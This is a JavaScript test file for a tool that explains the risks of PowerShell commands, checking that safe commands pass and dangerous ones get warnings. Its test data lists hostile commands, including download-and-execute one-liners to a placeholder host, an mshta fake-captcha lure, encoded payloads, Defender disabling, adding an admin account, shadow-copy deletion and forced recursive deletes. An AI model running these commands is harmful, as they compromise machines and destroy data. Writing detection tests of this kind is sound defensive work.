import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { root } from "../tools/lib/content.mjs";

const file = path.join(root, "assets/js/explain-risks.js");
vm.runInThisContext(fs.readFileSync(file, "utf8"), { filename: file });
const { assess } = globalThis.ExplainRisks;

const high = (cmd) => assess(cmd).risks.filter((r) => r.level === "high");
const flagged = (cmd) => assess(cmd).risks.filter((r) => r.level !== "info");

test("plain read-only commands raise nothing", () => {
  for (const cmd of ["Get-ChildItem -Path .\\docs", "Get-Process | Sort-Object CPU -Descending | Select-Object -First 5", "Get-ChildItem .\\ri", "Get-Content .\\form.txt"]) {
    assert.deepEqual(flagged(cmd), [], cmd);
  }
});

test("dangerous commands are flagged however they are written", () => {
  const cases = [
    "iwr https://x.example/a.ps1 | iex",
    "irm https://x.example/a.ps1 | powershell -",
    "& ([scriptblock]::Create((irm https://x.example/a.ps1)))",
    "Invoke-Command -ScriptBlock ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString('https://x.example')))",
    "ie`x (irm https://x.example/a.ps1)",
    "&(gcm i*x) (irm https://x.example/a.ps1)",
    "iwr https://x.example/a.exe -OutFile a.exe; Start-Process a.exe",
    "certutil -urlcache -split -f http://x.example/a.exe a.exe",
    "mshta https://x.example/verify.hta # I am not a robot",
    'powershell -enc "SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcAA="',
    "pwsh -encod SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcAA=",
    "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass",
    "Set-ExecutionPolicy -Scope CurrentUser Unrestricted",
    "Set-MpPreference \u2013DisableRealtimeMonitoring $true",
    "Set-MpPreference -ExclusionPath C:\\",
    "net user eve P@ss /add",
    "net localgroup administrators eve /add",
    "vssadmin delete shadows /all /quiet",
    "[System.IO.Directory]::Delete('C:\\data', $true)",
    "rm -r -fo C:\\Users\\me\\Documents",
    "Remove-Item \u2013Recurse \u2013Force C:\\Users",
  ];
  for (const cmd of cases) {
    assert.ok(high(cmd).length > 0, `expected a high-level warning for: ${cmd}`);
  }
});

test("medium risks that used to be missed", () => {
  for (const cmd of ["powershell -ep bypass -File x.ps1", "powershell -exec bypass -File x.ps1", "taskkill /f /im notepad.exe", "Clear-Content .\\log.txt", "Start-Process powershell -Verb RunAs"]) {
    assert.ok(flagged(cmd).length > 0, `expected a warning for: ${cmd}`);
  }
});

test("abbreviated -Recurse and -Force are explained on deletes", () => {
  const text = high("rm -r -fo C:\\Users\\me\\Documents").map((r) => r.text).join(" ");
  assert.match(text, /-Recurse means/);
  assert.match(text, /-Force also deletes/);
});

test("'only previews' is said only when every risky step really has -WhatIf", () => {
  assert.equal(assess("Remove-Item C:\\data -Recurse -WhatIf").previewOnly, true);
  assert.equal(assess("Get-ChildItem C:\\data | Remove-Item -WhatIf").previewOnly, true);
  for (const cmd of [
    "Remove-Item C:\\Users\\me -Recurse -Force # add -WhatIf to preview",
    "Remove-Item C:\\data -Recurse -Force -WhatIf:$false",
    "Get-ChildItem -WhatIf; Remove-Item C:\\data -Recurse",
    "Write-Host '-WhatIf'; Remove-Item C:\\data",
    "Remove-Item C:\\data -WhatIf; iwr https://x.example/a.ps1 | iex",
    "Remove-Item C:\\data <# -WhatIf #>",
  ]) {
    const result = assess(cmd);
    assert.equal(result.previewOnly, false, cmd);
    assert.ok(!result.risks.some((r) => /Good news/.test(r.text)), cmd);
  }
});

test("typographic dashes and quotes are counted", () => {
  assert.equal(assess("Get-ChildItem \u2013Recurse \u2018x\u2019").changed, 3);
  assert.equal(assess("Get-ChildItem -Recurse").changed, 0);
});
